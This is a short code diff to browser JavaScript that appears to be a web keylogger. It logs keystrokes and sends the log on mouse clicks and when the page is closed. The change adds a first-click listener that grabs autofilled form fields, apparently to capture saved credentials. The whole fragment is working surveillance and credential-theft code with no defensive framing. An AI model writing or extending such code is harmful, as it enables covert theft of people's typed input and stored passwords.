@@ -104,11 +104,15 @@ document.addEventListener('keydown',function(e) {
     }
 });
 
-/* On click event, save and send the current log and grab input boxes */
+/* On click event, save and send the current log */
 document.addEventListener('mousedown',function() {
     saveAndSendKS();
-    getInputFields();
 });
+
+/* On the FIRST click event, grab the autofilled fields */
+document.addEventListener('mousedown',function() {
+    getInputFields() ;
+},{once:true});
 
 /* Send user input before user leaves webpage or close tab/window*/
 window.onbeforeunload = function() {
